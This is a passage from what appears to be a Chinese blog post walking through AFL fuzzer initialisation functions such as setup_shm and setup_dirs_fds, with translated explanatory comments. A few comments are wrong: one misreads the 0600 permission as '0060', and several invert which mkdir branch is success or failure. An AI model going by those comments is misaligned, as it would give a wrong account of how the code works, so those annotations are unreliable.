class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_up_banner</span><span class="params">(u8* name)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//如果没有设置use_banner</span></span><br><span class="line">  <span class="keyword">if</span> (!use_banner) &#123;</span><br><span class="line">    <span class="comment">//如果设置了sync_id，赋值</span></span><br><span class="line">    <span class="keyword">if</span> (sync_id) &#123;</span><br><span class="line">      <span class="comment">//赋值</span></span><br><span class="line">      use_banner = sync_id;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//获取参数最后一个&#x27;/&#x27;后面的内容，即最终文件名</span></span><br><span class="line">      u8* trim = <span class="built_in">strrchr</span>(name, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="comment">//如果没获取到，把文件目录赋给use_banner</span></span><br><span class="line">      <span class="keyword">if</span> (!trim) use_banner = name; </span><br><span class="line">      <span class="comment">//如果获取到了，把最终文件名去掉&#x27;/&#x27;并赋给use_banner</span></span><br><span class="line">      <span class="keyword">else</span> use_banner = trim + <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果use_banner太长</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(use_banner) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">    <span class="comment">//创建一个44字长的tmp变量</span></span><br><span class="line">    u8* tmp = ck_alloc(<span class="number">44</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%.40s...&quot;</span>, use_banner);</span><br><span class="line">    <span class="comment">//将tmp赋给use_banner</span></span><br><span class="line">    use_banner = tmp;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty()"></a>check_if_tty()</h2><p>检查是否在 tty 终端上面运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_if_tty</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">ws</span>;</span></span><br><span class="line">  <span class="comment">//如果读取到了环境变量AFL_NO_UI</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_UI&quot;</span>)) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;Disabling the UI because AFL_NO_UI is set.&quot;</span>);</span><br><span class="line">    not_on_tty = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//通过ioctl读取window size</span></span><br><span class="line">  <span class="keyword">if</span> (ioctl(<span class="number">1</span>, TIOCGWINSZ, &amp;ws)) &#123;</span><br><span class="line">    <span class="comment">//如果报错为ENOTTY，说明当前不在一个tty终端运行</span></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOTTY) &#123;</span><br><span class="line">      OKF(<span class="string">&quot;Looks like we&#x27;re not running on a tty, so I&#x27;ll be a bit less verbose.&quot;</span>);</span><br><span class="line">      not_on_tty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="几个CPU检查相关的函数"><a href="#几个CPU检查相关的函数" class="headerlink" title="几个CPU检查相关的函数"></a>几个CPU检查相关的函数</h2><ul><li><p><code>get_core_count()</code>：获取 CPU 数量</p></li><li><p><code>check_crash_handling()</code>：确保核心转储不会进入程序</p></li><li><p><code>check_cpu_governor()</code>：检查CPU管理者</p></li></ul><h2 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post()"></a>setup_post()</h2><p>如果设置<code>AFL_POST_LIBRARY</code>环境变量，则加载 afl_postprocess() 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setup_post</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* dh;</span><br><span class="line">  <span class="comment">//获取环境变量AFL_POST_LIBRARY</span></span><br><span class="line">  u8* fn = getenv(<span class="string">&quot;AFL_POST_LIBRARY&quot;</span>);</span><br><span class="line">  u32 tlen = <span class="number">6</span>;</span><br><span class="line">  <span class="comment">//如果没获取到，返回</span></span><br><span class="line">  <span class="keyword">if</span> (!fn) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Loading postprocessor from &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line">  <span class="comment">//以RTLD_NOW模式打开AFL_POST_LIBRARY指向的动态链接库，在返回前解析出所有未定义的符号</span></span><br><span class="line">  dh = dlopen(fn, RTLD_NOW);</span><br><span class="line">  <span class="keyword">if</span> (!dh) FATAL(<span class="string">&quot;%s&quot;</span>, dlerror());</span><br><span class="line"></span><br><span class="line">  <span class="comment">//动态链接库中afl_postprocess()函数地址赋给post_handler</span></span><br><span class="line">  post_handler = dlsym(dh, <span class="string">&quot;afl_postprocess&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!post_handler) FATAL(<span class="string">&quot;Symbol &#x27;afl_postprocess&#x27; not found.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do a quick test. It&#x27;s better to segfault now than later =) */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//afl_postprocess()函数测试</span></span><br><span class="line">  post_handler(<span class="string">&quot;hello&quot;</span>, &amp;tlen);</span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;Postprocessor installed successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setup-shm-（very-important）"><a href="#setup-shm-（very-important）" class="headerlink" title="setup_shm()（very important）"></a>setup_shm()（very important）</h2><p>用于设置共享内存和 <code>virgin_bits</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_shm</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line">  <span class="comment">//如果in_bitmap为空，初始化virgin_bits[MAP_SIZE]每个值为255</span></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//初始化</span></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//调用 shmget 函数分配一块共享内存，并将返回的共享内存标识符保存到 shm_id</span></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line">  <span class="comment">/*函数的第一个参数：程序需要提供一个key,为共享内存段命名shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），</span></span><br><span class="line"><span class="comment">  用于后续的共享内存函数。调用失败返回-1。</span></span><br><span class="line"><span class="comment">    函数的第二个参数：需要共享的内存容量，这里大小为MAP_SIZE</span></span><br><span class="line"><span class="comment">    函数的第三个参数：权限标志</span></span><br><span class="line"><span class="comment">      IPC_CREAT 如果共享内存不存在，则创建一个共享内存</span></span><br><span class="line"><span class="comment">      IPC_EXCL 只有在共享内存不存在的时候，新的共享内存才建立，否则就产生错误</span></span><br><span class="line"><span class="comment">      0060代表拥有者具有读写权限</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果没有获得共享内存标识符，即共享内存创建失败，报错</span></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//注册程序正常终止时删除共享内存</span></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建shm_str字符串变量，里面存放shm_id</span></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果不是dumb模式，则设置SHM_ENV_VAR为shm_str</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//释放shm_str指针</span></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/*启动对该共享内存的访问，将共享内存的首地址赋给trace_bits，并把共享内存连接到当前进程的地址空间</span></span><br><span class="line"><span class="comment">    第一个参数，shm_id是由shmget()函数返回的共享内存标识</span></span><br><span class="line"><span class="comment">    第二个参数，指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址</span></span><br><span class="line"><span class="comment">    第三个参数，标志位，通常为0*/</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//共享内存访问启动失败，报错</span></span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">remove_shm</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  shmctl(shm_id, IPC_RMID, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">/*函数用来控制共享内存</span></span><br><span class="line"><span class="comment">    第一个参数，shm_id是shmget()函数返回的共享内存标识符</span></span><br><span class="line"><span class="comment">    第二个参数，IPC_RMID：删除共享内存段</span></span><br><span class="line"><span class="comment">    第三个参数，指向共享内存模式和访问权限的结构，这里指向NULL*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16()"></a>init_count_class16()</h2><p>统计 AFL 遍历路径的次数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="comment">/*记录路径命中次数，因为可能循环5次和循环6次造成的效果一样，所以把它们统一认为是循环了8次*/</span></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u16 count_class_lookup16[<span class="number">65536</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">init_count_class16</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 b1, b2;</span><br><span class="line">  <span class="comment">//将count_class_lookup16[65536]拆分成两个嵌套的256次循环，256x256=65536</span></span><br><span class="line">  <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++) </span><br><span class="line">    <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">    <span class="comment">/*count_class_lookup8[b1]左移8的结果和count_class_lookup8[b2]进行按位或运算，</span></span><br><span class="line"><span class="comment">      再把整个结果放在 count_class_lookup8[b1左移8再加上b2] 中*/</span></span><br><span class="line">      count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] = </span><br><span class="line">        (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">        count_class_lookup8[b2];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds()"></a>setup_dirs_fds()</h2><p>准备输出文件夹和文件描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Prepare output directories and fds. */</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_dirs_fds</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* tmp;</span><br><span class="line">  s32 fd;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Setting up output directories...&quot;</span>);</span><br><span class="line">  <span class="comment">/*如果sync_id存在，创建文件夹sync_dir，权限设置为0700(读写执行)</span></span><br><span class="line"><span class="comment">    且errno != EEXIST，抛出异常*/</span></span><br><span class="line">  <span class="keyword">if</span> (sync_id &amp;&amp; mkdir(sync_dir, <span class="number">0700</span>) &amp;&amp; errno != EEXIST)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, sync_dir);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果创建文件夹out_dir，且权限设置为0700成功</span></span><br><span class="line">  <span class="keyword">if</span> (mkdir(out_dir, <span class="number">0700</span>)) &#123;</span><br><span class="line">    <span class="comment">//如果errno != EEXIST，抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (errno != EEXIST) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, out_dir);</span><br><span class="line">    <span class="comment">//调用函数</span></span><br><span class="line">    maybe_delete_out_dir();</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果创建文件夹out_dir失败</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果设置了in_place_resume，抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (in_place_resume)</span><br><span class="line">      FATAL(<span class="string">&quot;Resume attempted but old output directory not found&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//以只读模式打开文件并将句柄赋值给out_dir_fd</span></span><br><span class="line">    out_dir_fd = open(out_dir, O_RDONLY);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __sun<span class="comment">//如果没有定义宏__sun</span></span></span><br><span class="line">    <span class="comment">//如果out_dir文件打开失败，或out_dir文件简历互斥锁定失败，抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (out_dir_fd &lt; <span class="number">0</span> || flock(out_dir_fd, LOCK_EX | LOCK_NB))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to flock() output directory.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__sun */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//创建 queue 文件夹</span></span><br><span class="line">  <span class="comment">/* Queue directory for any starting &amp; discovered paths. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建 out_dir/queue 文件夹，设置权限为0700</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Top-level directory for queue metadata used for session</span></span><br><span class="line"><span class="comment">     resume and related tasks. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//创建out_dir/queue/.state/,设置权限为0700</span></span><br><span class="line">  <span class="comment">//该文件夹主要保存用于session resume和related tasks的队列元数据</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Directory for flagging queue entries that went through</span></span><br><span class="line"><span class="comment">     deterministic fuzzing in the past. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//创建out_dir/queue/.state/deterministic_done/,设置权限为0700</span></span><br><span class="line">  <span class="comment">//用于标记过去经历过deterministic fuzzing的队列条目</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/deterministic_done/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Directory with the auto-selected dictionary entries. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//创建out_dir/queue/.state/auto_extras/,设置权限为0700</span></span><br><span class="line">  <span class="comment">//用于保存带有自动选择的字典条目</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/auto_extras/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The set of paths currently deemed redundant. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">//创建out_dir/queue/.state/redundant_edges/,设置权限为0700</span></span><br><span class="line">  <span class="comment">//用于保存当前被认为是多余的路径集合</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/redundant_edges/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The set of paths showing variable behavior. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建out_dir/queue/.state/variable_behavior/,设置权限为0700</span></span><br><span class="line">  <span class="comment">//保存不同行为的路径集</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/queue/.state/variable_behavior/&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sync directory for keeping track of cooperating fuzzers. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果sync_id存在</span></span><br><span class="line">  <span class="keyword">if</span> (sync_id) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建out_dir/.synced/，设置权限为0700</span></span><br><span class="line">    <span class="comment">//做目录同步，该目录用于跟踪cooperating fuzzers</span></span><br><span class="line">    tmp = alloc_printf(<span class="string">&quot;%s/.synced/&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>) &amp;&amp; (!in_place_resume || errno != EEXIST))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line"></span><br><span class="line">    ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* All recorded crashes. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建 out_dir/crashes/ 目录,设置权限为读写执行‘</span></span><br><span class="line">  <span class="comment">//记录crash</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/crashes&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* All recorded hangs. */</span></span><br><span class="line"></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/hangs&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(tmp, <span class="number">0700</span>)) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Generally useful file descriptors. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//用读写的方式打开/dev/null，打不开报错</span></span><br><span class="line">  dev_null_fd = open(<span class="string">&quot;/dev/null&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_null_fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to open /dev/null&quot;</span>);</span><br><span class="line">  <span class="comment">//用只读方式打开/dev/urandom，打不开报错</span></span><br><span class="line">  dev_urandom_fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (dev_urandom_fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to 